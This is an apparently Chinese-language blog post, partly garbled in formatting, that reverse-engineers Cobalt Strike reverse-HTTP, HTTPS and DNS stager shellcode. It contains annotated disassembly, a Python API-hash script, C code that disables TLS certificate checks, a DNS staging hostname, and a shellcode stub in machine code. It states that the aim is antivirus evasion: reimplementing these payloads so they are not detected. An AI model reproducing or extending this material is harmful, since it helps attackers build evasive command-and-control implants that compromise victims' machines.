        User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; Xbox)
接下来，Send成功后，想来该是开辟一块缓冲区
        004000F8  test        eax,eax  
    004000FA  je          004002C3  
    00400100  xor         edi,edi  
    00400102  test        esi,esi  
    00400104  je          0040010A  
    00400106  mov         ecx,edi  
    00400108  jmp         00400113    #跳转
    0040010A  push        5DE2C5AAh  
    0040010F  call        ebp  
    00400111  mov         ecx,eax  
    00400113  push        315E2145h   
    00400118  call        ebp    #真正执行的
但是这个很奇怪，没有参数的一个API，先继续往下看
        0040011A  xor         edi,edi  
    0040011C  push        edi                     ==> 0
    0040011D  push        7  
    0040011F  push        ecx  
    00400120  push        esi                   ==> hRequest
    00400121  push        eax  
    00400122  push        0BE057B7h  
    00400127  call        ebp
这个API参数第一个值是上一个API的返回值， **(eax, hRequest, 0xFFFFE000, 7, 0)**
再继续
        004002CA  push        40h  
    004002CC  push        1000h  
    004002D1  push        400000h  
    004002D6  push        edi  
    004002D7  push        0E553A458h  
    004002DC  call        ebp
这就很明显了，完成了 **VirtualAlloc(0, 0x400000, 0x1000, 0x40)** ，也就是可执行的一块空间
        004002DE  xchg        eax,ebx  
    004002DF  mov         ecx,0  
    004002E4  add         ecx,ebx  
    004002E6  push        ecx             ==>将分配的空间入栈，方便后续ret过去
    004002E7  push        ebx  
    004002E8  mov         edi,esp  
    004002EA  push        edi  
    004002EB  push        2000h  
    004002F0  push        ebx  
    004002F1  push        esi  
    004002F2  push        0E2899612h  
    004002F7  call        ebp
这一段，参考MSF实现，不难发现这里实际完成 **InternetReadFile(hRequest, PCHAR(lpBuffer +
dwLength), 0x2000, &dwBytesRead);**
        004002F9  test        eax,eax  
    004002FB  je          004002C3  
    004002FD  mov         eax,dword ptr [edi]  
    004002FF  add         ebx,eax  
    00400301  test        eax,eax  
    00400303  jne         004002EA
循环读取，直到NULL
        pop rax
    ret
虽然和MSF差不多，但是我们有两个API没搞清楚是什么，我试了一下不调用那两个API，发现CS上线可以，但是通信有问题。所以必须想办法弄出API
    * 思路 A
跟踪进入HASH搜索API，在搜索成功后回退上一个函数字符串就是了
    * 思路 B
​ 逆向cs 的shellcode搜索API的hash函数，其分为两部分，一个API的hash 等于其所在DLL的hash加上apiName的hash。
```python  
def ror_13(now):
        return circular_shift_right(now, 13, 32)
def hash_dll(dllName):
        dllWideName = []
    for each in dllName:
        dllWideName.append(each)
        dllWideName.append('\x00')
    dllWideName += ['\x00', '\x00']
    print(dllWideName)
    hsValue = 0
    for each in dllWideName:
        each = ord(each)
        if each >= 0x61:
            each -= 0x20
        hsValue = ror_13(hsValue) + each
    print(dllName, hex(hsValue))
      return hsValue
def hash_api(apiName):  
hsValue = 0  
for each in apiName:
    each = ord(each)
          hsValue = ror_13(hsValue) + each
      hsValue = ror_13(hsValue)
      print(apiName, hex(hsValue))   
      return hsValue
def hash_dll_api(dllName, apiName):  
dllHash = hash_dll(dllName)  
apiHash = hash_api(apiName)
    print("apiName: ", hex((dllHash + apiHash) & 0xFFFFFFFF))
    连个方法都可以得出，上面的两个API分别是
      ```c++
      HWND GetDesktopWindow()   // 获取当前DesktopWindow的 handle
      void InternetErrorDlg(
        HWND      hWnd,
        HINTERNET hRequest,
        DWORD     dwError,
        DWORD     dwFlags,
        LPVOID    *lppvData
      );                        实际执行的是InternetErrorDlg(hWnd, hRequest, 0xFFFFE000, 7, 0)
##### ReverseHttps
  * 几乎一样，不同在于
```c  
//Http_Open_flag  
if (ssl)
        hRequest = HttpOpenRequestA(hConnection, NULL, (PCHAR)server_uri_https, NULL, NULL, NULL, 0x84C03200,  NULL);
else
        hRequest = HttpOpenRequestA(hConnection, NULL, (PCHAR)server_uri_http, NULL, NULL, NULL, 0x84400200, NULL);
    //ssl secure flag
    if (ssl) {
        //Secure flags 0x3380
        dwFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION;
        //Here first arg is hRequest but not hInternet
        if (!InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags))) {
            exit(1);
        }
    }
    ##### ReverseDns
    * ##### start第一部分
      ```assembly
      00990090  xor         eax,eax  
      00990092  push        40h  
      00990094  mov         ah,10h  
      00990096  push        1000h  
      0099009B  push        7FFFFh  
      009900A0  push        0  
      009900A2  push        0E553A458h  
      009900A7  call        ebp  
      009900A9  add         eax,40h  
      009900AC  mov         edi,eax  
      009900AE  push        eax
利用 **方法A** 可得到这里实际调用 **VirtualAlloc(0, 0x7FFFF, MEM_COMMIT,
PAGE_EXECUTE_READWRITE)** , 开辟了一块可执行空间。而后将该地址入栈。
    009900AF  xor         eax,eax  
      009900B1  mov         al,70h  
      009900B3  mov         ah,69h  
      009900B5  push        eax  
      009900B6  push        61736E64h  
      009900BB  push        esp  
      009900BC  push        726774Ch  
      009900C1  call        ebp
接下来的，实际调用的是 **LoadLibraryA("dnsapi")**
之后
    0099011B  push        esp  
      0099011C  pop         ebx  
      0099011D  sub         ebx,4  
      00990120  push        ebx  
      00990121  push        0  
      00990123  push        ebx  
      00990124  push        0  
      00990126  push        248h  
      0099012B  push        10h  
      0099012D  push        eax  
      0099012E  push        0C99CC96Ah  
      00990133  call        ebp
实际完成的工作是 **DnsQuery_A(dnsName， 0x10, 0x248, 0, ebx, 0)**
其中dnsName是和CS里的Host
stager有关，可以抓包看到(所谓的dns隧道，其实就是利用dnsName来传递信息的),，其中ebx指向DNS查询结果的压缩数据处。
    aaa.stage.10965191.ns1.treebacker.cn
当执行失败时
    00A30139  mov         eax,esi  
      00A3013B  dec         eax  
      00A3013C  mov         bl,0  
      00A3013E  mov         byte ptr [eax],bl  
      00A30140  inc         eax  
      00A30141  mov         esi,dword ptr [eax]  
      00A30143  jmp         00A301B5  
    00A30145  call        00A300CA
继续走，来到
    00990195  jle         0099019E                      #跳过
      00990197  push        56A2B5F0h  
    0099019C  call        ebp  
      0099019E  push        13E8h                       #执行这里
    009901A3  push        0E035F044h  
      009901A8  call        ebp
    这里实际执行了**Sleep(0x13E8)**然后再重复**DnsQuery_A(dnsName, 0x10, 0x248, ebx, 0, ebx)**
      ebx指向的**DNS_RECORD**记录结构。
      而当DNS查询成功时
      ```assembly
    .....................省略
      .data:004031EB                 push    edi
      .data:004031EC                 push    edi
      .data:004031ED                 push    edi
      .data:004031EE                 inc     ebx
      .data:004031EF                 xchg    edi, edx
      .data:004031F1                 push    edx
      .data:004031F2                 push    edi
      .data:004031F3                 push    ebx
      .data:004031F4                 sub     edx, 0FFh
      .data:004031FA                 push    edx
      .data:004031FB                 push    0CC8E00F4h
      .data:00403200                 call    ebp             ; StrlenA
      .data:00403202                 pop     ebx
      .data:00403203                 pop     edi
      .data:00403204                 pop     edx
      .data:00403205                 cmp     eax, 0FFh       ; 去掉前0xff字节
      .data:0040320A                 jl      short loc_403213 ; 接收完毕
      .data:0040320C                 jmp     loc_4030F0      ; 否则继续
      .data:00403211 ; ---------------------------------------------------------------------------      .data:00403211
      .data:00403211 loc_403211:                             ; CODE XREF: sub_4030E2+F4↑j
      .data:00403211                 mov     edi, edx
      .data:00403213
      .data:00403213 loc_403213:                             ; CODE XREF: sub_4030E2+128↑j
      .data:00403213                 add     edi, 0
      .data:00403219                 jmp     edi             ; 执行获取到的stage
实际执行了 **lstrlenA()**
可以发现Dns查询, CS回复的数据包中，data里最后0xFF字节是压缩的tage的部分
会发现这个stage是由可打印字符（大写字母组成），这其实是 **alpha** 编码的shellcode。
这段stage保存的位置
    PDNS_RECORD->Data.SOA.pNameAdministrator
整个过程单步调试抓包可以发现发送的dnsName
    aaa
      baa
      caa
      ...
      aba
      bba
      cba
      ...
      aza
      bza
      cza
      一直找到0.0.0.0为止
抓包，过滤DNS，能够清楚地看到整个流程
当成功解析到 **0.0.0.0** 的时候，Client就在CS里上线了！
而dns的stage并不是完全独立的，有一定的依赖
    edi ==> stage起始地址
这个问题可以自己在原stage前加上一段获取eip指针赋给edi，来解决
    call next:
    next: 
        pop edi         ;   edi指向 next， edi
        add edi, 4      ;   edi指向  stage
    stage:
机器码
    0xE8, 0x00, 0x00, 0x00, 0x00, 0x5F, 0x83, 0xC7, 0x04
以上函数部分原型
    DNS_STATUS DnsQuery_A(
        PCSTR       pszName,
        WORD        wType,
        DWORD       Options,
        PVOID       pExtra,
        PDNS_RECORD *ppQueryResults,
        PVOID       *pReserved
      );
研究了一下CS生成的exe文件
    利用的Pipe 传输xor加密shellcode
    Pipe通信获取之后，解密回来，CreateThread执行
问题来了？为什么要做这些呢？
免杀、免杀、免杀
将MSF和CS常用的payload转为高级语言直接实现，不需要加载器，可以大幅度提高免杀的可操作性！（起码不会有shellcode在内存里），在此基础上，做下源码级别的免杀（甚至做个图形化混淆视听）